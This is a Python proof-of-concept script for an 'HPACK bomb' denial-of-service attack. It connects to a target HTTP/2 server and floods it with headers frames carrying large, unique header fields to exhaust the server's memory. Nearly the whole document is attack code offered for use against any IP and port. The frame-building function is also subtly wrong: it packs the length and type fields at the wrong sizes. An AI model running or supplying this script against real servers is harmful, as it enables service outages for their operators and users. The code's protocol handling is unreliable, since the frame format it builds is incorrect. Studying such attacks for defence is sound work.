#!/usr/bin/env python3
"""
Proof-of-Concept: HPACK Bomb / Header Table Exhaustion

This script demonstrates the HPACK Bomb vulnerability (RFC 9113 Section 10.5.1).
It establishes an HTTP/2 connection and sends a series of HEADERS frames containing
large, unique header fields. This forces the receiver's HPACK dynamic table to grow
until it exhausts memory or hits implementation limits.

Prerequisites:
  - Python 3
  - `hpack` library: pip install hpack

Usage:
  python poc_hpack_bomb.py <target_ip> <target_port>
"""

import sys
import socket
import struct
import time
import hpack

# --- HTTP/2 Constants ---
HTTP2_PREFACE = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'

# Frame Types
FRAME_TYPE_DATA = 0x0
FRAME_TYPE_HEADERS = 0x1
FRAME_TYPE_SETTINGS = 0x4
FRAME_TYPE_PRIORITY = 0x2
FRAME_TYPE_RST_STREAM = 0x3
FRAME_TYPE_PUSH_PROMISE = 0x5
FRAME_TYPE_PING = 0x6
FRAME_TYPE_GOAWAY = 0x7
FRAME_TYPE_WINDOW_UPDATE = 0x8
FRAME_TYPE_CONTINUATION = 0x9

# Frame Flags
FLAG_END_STREAM = 0x1
FLAG_END_HEADERS = 0x4
FLAG_ACK = 0x1

# Error Codes
ERROR_NO_ERROR = 0x0
ERROR_PROTOCOL_ERROR = 0x1
ERROR_INTERNAL_ERROR = 0x2
ERROR_FLOW_CONTROL_ERROR = 0x3
ERROR_SETTINGS_TIMEOUT = 0x4
ERROR_STREAM_CLOSED = 0x5
ERROR_FRAME_SIZE_ERROR = 0x6
ERROR_REFUSED_STREAM = 0x7
ERROR_CANCEL = 0x8
ERROR_COMPRESSION_ERROR = 0x9
ERROR_CONNECT_ERROR = 0xA
ERROR_ENHANCE_YOUR_CALM = 0xB
ERROR_INADEQUATE_SECURITY = 0xC
ERROR_HTTP_1_1_REQUIRED = 0xD

# Settings Identifiers
SETTINGS_HEADER_TABLE_SIZE = 0x1
SETTINGS_ENABLE_PUSH = 0x2
SETTINGS_MAX_CONCURRENT_STREAMS = 0x3
SETTINGS_INITIAL_WINDOW_SIZE = 0x4
SETTINGS_MAX_FRAME_SIZE = 0x5
SETTINGS_MAX_HEADER_LIST_SIZE = 0x6

def create_http2_frame(frame_type, flags, stream_id, payload):
    """
    Constructs a raw HTTP/2 frame.
    Format: 3-byte length, 1-byte type, 1-byte flags, 4-byte stream ID, payload
    """
    length = len(payload)
    frame_header = struct.pack('!IHB', length, frame_type, flags)
    # Stream ID is 31 bits, ignore the first bit (R)
    frame_header += struct.pack('!I', stream_id & 0x7FFFFFFF)
    return frame_header + payload

def create_settings_frame(settings_dict):
    """
    Creates a SETTINGS frame payload from a dictionary of setting_id: value.
    """
    payload = b''
    for setting_id, value in settings_dict.items():
        payload += struct.pack('!HI', setting_id, value)
    return create_http2_frame(FRAME_TYPE_SETTINGS, 0x0, 0, payload)

def create_settings_ack_frame():
    """
    Creates a SETTINGS ACK frame.
    """
    return create_http2_frame(FRAME_TYPE_SETTINGS, FLAG_ACK, 0, b'')

def create_goaway_frame(last_stream_id, error_code, debug_data=b''):
    """
    Creates a GOAWAY frame.
    """
    payload = struct.pack('!II', last_stream_id, error_code) + debug_data
    return create_http2_frame(FRAME_TYPE_GOAWAY, 0x0, 0, payload)

def send_headers_frame(sock, stream_id, headers_list, hpack_encoder):
    """
    Encodes headers using HPACK and sends a HEADERS frame.
    """
    # Encode headers using HPACK
    encoded_headers = hpack_encoder.encode(headers_list)
    
    # Create HEADERS frame with END_HEADERS flag
    frame = create_http2_frame(FRAME_TYPE_HEADERS, FLAG_END_HEADERS, stream_id, encoded_headers)
    sock.sendall(frame)
    print(f"[*] Sent HEADERS frame on Stream {stream_id} with {len(headers_list)} headers")

def main():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <target_ip> <target_port>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])

    print(f"[*] Target: {target_ip}:{target_port}")
    print("[*] Starting HPACK Bomb PoC...")

    # 1. Establish TCP connection
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((target_ip, target_port))
        print("[+] TCP connection established.")
    except Exception as e:
        print(f"[-] Failed to connect: {e}")
        sys.exit(1)

    try:
        # 2. Send HTTP/2 Connection Preface
        sock.sendall(HTTP2_PREFACE)
        print("[+] Sent HTTP/2 Connection Preface.")

        # 3. Send SETTINGS frame
        # We can suggest a large header table size to the server, though the server's limit is what matters.
        # Some vulnerable servers might not enforce their own limits strictly.
        settings = {
            SETTINGS_HEADER_TABLE_SIZE: 4096,  # Default
            SETTINGS_MAX_CONCURRENT_STREAMS: 100,
        }
        sock.sendall(create_settings_frame(settings))
        print("[+] Sent SETTINGS frame.")

        # 4. Receive SETTINGS and ACK
        # Wait for server's SETTINGS frame
        data = sock.recv(4096)
        if not data:
            print("[-] Connection closed by server.")
            sys.exit(1)
        
        # Parse incoming frames to find SETTINGS
        offset = 0
        while offset < len(data):
            if offset + 9 > len(data):
                break
            length = struct.unpack('!I', data[offset:offset+3] + b'\x00')[0]
            frame_type = data[offset+3]
            flags = data[offset+4]
            stream_id = struct.unpack('!I', data[offset+5:offset+9])[0]
            
            if frame_type == FRAME_TYPE_SETTINGS:
                print("[+] Received SETTINGS frame from server.")
                # Send SETTINGS ACK
                sock.sendall(create_settings_ack_frame())
                print("[+] Sent SETTINGS ACK.")
            offset += 9 + length

        # 5. Prepare HPACK Encoder
        hpack_encoder = hpack.Encoder()
        # Set the maximum table size to a large value to test the server's handling
        # The server should limit this, but if it doesn't, we can fill it up.
        hpack_encoder.max_allowed_table_size = 65536  # 64KB

        # 6. Send HPACK Bomb
        # Generate large, unique header fields to fill the dynamic table
        # Each entry in the dynamic table consumes memory. By sending many unique, large entries,
        # we force the server to allocate significant memory.
        
        stream_id = 1
        num_requests = 100  # Number of requests to send
        header_size = 1024  # Size of each header value in bytes
        
        print(f"[*] Sending {num_requests} requests with large, unique headers...")
        
        for i in range(num_requests):
            # Create a unique header name and value
            # Using a random-looking string to ensure uniqueness
            header_name = f"x-bomb-{i}"
            header_value = 'A' * header_size
            
            headers_list = [
                (':method', 'GET'),
                (':path', '/'),
                (':scheme', 'http'),
                (':authority', target_ip),
                (header_name, header_value),
            ]
            
            try:
                send_headers_frame(sock, stream_id, headers_list, hpack_encoder)
                stream_id += 2  # Increment stream ID for next request (client-initiated streams are odd)
                time.sleep(0.1)  # Small delay to allow server to process
            except Exception as e:
                print(f"[-] Error sending headers: {e}")
                break

        # 7. Observe Outcome
        print("[*] Bomb sent. Waiting for server response...")
        time.sleep(5)
        
        # Try to receive any response
        try:
            response = sock.recv(4096)
            if response:
                print("[+] Received response from server:")
                print(response[:200])  # Print first 200 bytes
            else:
                print("[-] No response received. Server might be overloaded or crashed.")
        except socket.timeout:
            print("[-] Timeout waiting for response. Server might be overloaded.")
        except Exception as e:
            print(f"[-] Error receiving response: {e}")

    finally:
        sock.close()
        print("[*] Connection closed.")

if __name__ == "__main__":
    main()
